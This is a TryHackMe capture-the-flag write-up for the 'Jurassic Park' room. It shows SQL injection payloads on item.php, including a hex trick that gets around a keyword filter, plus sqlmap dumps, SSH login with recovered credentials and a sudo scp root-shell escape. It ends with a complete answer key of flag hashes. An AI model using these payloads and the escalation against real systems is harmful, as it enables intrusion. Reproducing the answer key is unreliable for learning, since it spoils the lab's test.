# TryHackMe - Jurassic Park

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect published writeups and room answers.*

**Difficulty:** Medium-Hard  
**Category:** Web, SQLi, Enumeration, Privilege Escalation  
**Room:** [Jurassic Park](https://tryhackme.com/room/jurassicpark) (Premium)  
**Description:** Enumerate a Jurassic Park souvenir shop, exploit SQL injection to steal credentials, SSH in as Dennis Nedry, and hunt five flags across the filesystem.

## Introduction

Dennis Nedry "secured" the web app — but left exploitable SQLi on the shop. Your path: dump the database, log in over SSH, find hidden flags, then abuse `sudo scp` for root.

**Objectives:**
- Identify the shop database and table structure via SQLi
- Recover Dennis's SSH password from `park.users`
- Locate flags 1–3 on the box (flag 4 does not exist)
- Escalate with `sudo scp` and read flag 5

---

## Reconnaissance

```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```

| Port | Service |
|------|---------|
| 22 | SSH (OpenSSH 7.2p2, Ubuntu) |
| 80 | HTTP (Apache 2.4.18) |

Add to `/etc/hosts`:

```
<TARGET_IP>  jurassicpark.thm
```

Browse port **80** — a Jurassic Park souvenir shop. Notable findings:

- `robots.txt` → `Wubbalubbadubdub`
- HTML comment on the homepage: hidden video at `assets/theme.mp3` (easter egg — turn volume up)
- Shop at `/shop.php`; items link to `/item.php?id=<n>`

Item `id=5` reveals Dennis's WAF note: blocked characters include `'`, `#`, `DROP`, `username`, `@`, `----`.

---

## Stage 1 — SQL Injection on `item.php`

The `id` parameter on `/item.php` is injectable (boolean, error-based, and time-based blind).

### Manual UNION (quick answers)

Find injectable columns:

```
http://jurassicpark.thm/item.php?id=5 union select 1,2,3,4,5
```

Columns **2**, **4**, and **5** are reflected. Examples:

```
# database name
/item.php?id=5 union select 1,database(),3,version(),5

# all schemas
/item.php?id=5 union select 1,(select group_concat(schema_name,"\r\n") from information_schema.schemata),3,version(),5

# tables and columns
/item.php?id=5 union select 1,(select group_concat(table_name,":",column_name) from information_schema.columns where table_schema=database()),3,4,5
```

The shop DB is **`park`**. Table **`items`** has **5** columns: `id`, `package`, `price`, `information`, `sold`. Table **`users`** holds credentials.

The word `username` is filtered — use hex `0x757365726e616d65` instead:

```
/item.php?id=5 union select 1,(select group_concat(0x757365726e616d65,":",password) from park.users),3,4,5
```

Passwords: `D0nt3ATM3`, `ih8dinos`. User **dennis** maps to **`ih8dinos`**.

### sqlmap (automated dump)

Capture a request from DevTools (click "Buy" on shop.php → copy request headers), then:

```bash
sqlmap -r shop.request -dbms=mysql --dbs
sqlmap -r shop.request -dbms=mysql -D park -T items --dump
sqlmap -r shop.request -dbms=mysql -D park -T users --dump
```

Or directly:

```bash
sqlmap -u 'http://jurassicpark.thm/item.php?id=5' --dump -D park
```

---

## Stage 2 — SSH as dennis

```bash
ssh dennis@jurassicpark.thm
# password: ih8dinos
```

Banner confirms **Ubuntu 16.04.5 LTS**.

```bash
cat /etc/os-release   # or lsb_release -a
uname -a
```

---

## Stage 3 — Flags 1, 2, and 3

### Flag 1 — home directory

```bash
cat ~/flag1.txt
```

The file has two lines: a congrats message and the hash to submit on THM.

### Flag 2 — unusual path

```bash
find / -iname "flag*.txt" 2>/dev/null
cat /boot/grub/fonts/flagTwo.txt
```

### Flag 3 — bash history

`.bash_history` is not linked to `/dev/null` on this box:

```bash
head ~/.bash_history
# Flag3:<hash>
```

---

## Stage 4 — No fourth flag

The room explicitly states there is no flag 4. Mark the task **Completed** on TryHackMe.

`.viminfo` may reference `/tmp/flagFour.txt` — a red herring.

---

## Stage 5 — Privilege escalation → flag 5

Enumerate sudo rights:

```bash
sudo -l
```

```
User dennis may run the following commands:
    (ALL) NOPASSWD: /usr/bin/scp
```

`test.sh` in Dennis's home hints at `/root/flag5.txt`.

### Option A — copy the flag (read only)

```bash
sudo /usr/bin/scp /root/flag5.txt .
cat flag5.txt
```

### Option B — root shell via GTFOBins (`scp -S`)

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > "$TF"
chmod +x "$TF"
sudo scp -S "$TF" x y:
# id → uid=0(root)
cat /root/flag5.txt
```

Reference: [GTFOBins — scp](https://gtfobins.github.io/gtfobins/scp/)

---

## Attack Chain Summary

```
Recon (80/22)
  └─> /item.php?id= SQLi (UNION / sqlmap)
        └─> dump park.users → dennis:ih8dinos
              └─> SSH
                    ├─> ~/flag1.txt
                    ├─> /boot/grub/fonts/flagTwo.txt
                    ├─> ~/.bash_history (flag 3)
                    └─> sudo -l → NOPASSWD scp
                          └─> /root/flag5.txt (copy or GTFOBins shell)
```

---

## TryHackMe Answers

| Question | Answer |
|----------|--------|
| SQL database name | `park` |
| Number of columns (items table) | `5` |
| System version | `ubuntu 16.04` |
| Dennis's password | `ih8dinos` |
| First flag contents | `b89f2d69c56b9981ac92dd267f` |
| Second flag contents | `96ccd6b429be8c9a4b501c7a0b117b0a` |
| Third flag contents | `b4973bbc9053807856ec815db25fb3f1` |
| Fourth flag | *(none — mark Completed)* |
| Fifth flag contents | `2a7074e491fcacc7eeba97808dc5e2ec` |

---

## References

- [apjone.uk — Jurassic Park CTF](https://apjone.uk/posts/tryhackme-jurassic-park-ctf/)
- [jesusgavancho — Jurassic Park writeup](https://github.com/jesusgavancho/TryHackMe_and_HackTheBox/blob/master/Jurassic%20Park.md)
- [GTFOBins — scp](https://gtfobins.github.io/gtfobins/scp/)
- [HackTricks — sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
